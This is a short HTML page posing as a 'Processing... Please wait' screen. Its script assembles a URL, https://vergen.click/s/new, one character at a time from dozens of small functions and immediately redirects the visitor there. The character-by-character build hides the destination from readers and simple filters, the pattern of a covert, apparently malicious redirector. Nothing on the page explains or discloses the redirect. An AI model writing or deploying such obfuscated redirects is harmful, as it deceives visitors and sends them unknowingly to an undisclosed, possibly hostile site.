<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            () => 'h',
            function() { return 't'; },
            _ => 't',
            function() { return 'p'; },
            () => 's',
            function() { return ':'; },
            function() { return '/'; },
            function() { return '/'; },
            function() { return 'v'; },
            function() { return 'e'; },
            () => 'r',
            function() { return 'g'; },
            _ => 'e',
            _ => 'n',
            function() { return '.'; },
            function() { return 'c'; },
            () => 'l',
            () => 'i',
            function() { return 'c'; },
            () => 'k',
            _ => '/',
            () => 's',
            _ => '/',
            () => 'n',
            _ => 'e',
            function() { return 'w'; }
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>
<body>
    <p>Please wait...</p>
</body>
</html>
